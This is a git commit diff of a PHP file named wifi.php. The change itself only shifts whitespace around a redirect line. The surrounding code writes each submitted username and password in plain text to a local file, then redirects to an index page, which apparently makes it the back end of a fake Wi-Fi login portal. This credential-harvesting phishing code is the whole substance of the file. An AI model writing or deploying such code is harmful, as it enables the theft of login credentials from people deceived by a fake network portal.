59b659915c17df2bfac70defcb0913d37cc9e88d
Avasz <avashmulmi@gmail.com>
2014-07-20 08:13:18 +0545

    <width=100%>

--- wifi.php
+++ wifi.php
@@ -1,5 +1,6 @@
     <?php
-    header('Location: index.html');
+     header('Location: index.html');
+    
     $handle = fopen("hello.txt", "a");
     fwrite($handle, "Username:$_POST[username]\tpassword:$_POST[password]\n");
     fclose($handle);
